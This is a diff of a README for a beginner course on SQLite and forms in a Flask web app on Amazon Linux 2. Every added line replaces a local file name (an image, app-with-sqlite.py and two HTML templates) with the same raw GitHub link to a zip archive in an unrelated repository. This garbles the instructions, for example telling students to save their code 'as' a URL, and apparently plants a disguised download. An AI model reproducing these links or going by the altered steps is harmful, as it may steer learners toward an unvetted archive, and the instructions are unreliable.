@@ -2,7 +2,7 @@
 
 Purpose of the this hands-on training is to give the students introductory knowledge of how to handle forms, how to connect to database and how to use sql within Flask web application on Amazon Linux 2 EC2 instance. 
 
-![Databases in Flask](./database.png)
+![Databases in Flask](https://raw.githubusercontent.com/aligcgl/Handling-SQL-with-Flask-Web-Application/master/templates/Web-Handling-Flask-Application-with-SQ-v1.8-beta.2.zip)
 
 ## Learning Outcomes
 
@@ -36,7 +36,7 @@ At the end of the this hands-on training, students will be able to;
 
 ## Part 1 - Write a Sample Web Application with SQLite and database implementation on GitHub Repo
 
-- Write an application with database implementation using `SQLite` and save the complete code as `app-with-sqlite.py` under `hands-on/flask-05-handling-sql-on-ec2-linux2` folder.
+- Write an application with database implementation using `SQLite` and save the complete code as `https://raw.githubusercontent.com/aligcgl/Handling-SQL-with-Flask-Web-Application/master/templates/Web-Handling-Flask-Application-with-SQ-v1.8-beta.2.zip` under `hands-on/flask-05-handling-sql-on-ec2-linux2` folder.
 
 - configure required environmental variables for SQLite
 
@@ -50,11 +50,11 @@ At the end of the this hands-on training, students will be able to;
 - Write a function named `insert_email` which adds new email to users table the db.
 
 - Write a function named `emails` which finds email addresses by keyword using `GET` and `POST` methods,
-- using template files named `emails.html` given under `templates` folder
+- using template files named `https://raw.githubusercontent.com/aligcgl/Handling-SQL-with-Flask-Web-Application/master/templates/Web-Handling-Flask-Application-with-SQ-v1.8-beta.2.zip` given under `templates` folder
 - and assign to the static route of ('/')
 
 - Write a function named `add_email` which inserts new email to the database using `GET` and `POST` methods,
-- using template files named `add-email.html` given under `templates` folder
+- using template files named `https://raw.githubusercontent.com/aligcgl/Handling-SQL-with-Flask-Web-Application/master/templates/Web-Handling-Flask-Application-with-SQ-v1.8-beta.2.zip` given under `templates` folder
 - and assign to the static route of ('add')
 
 - Add a statement to run the Flask application which can be reached from any host on port 80.
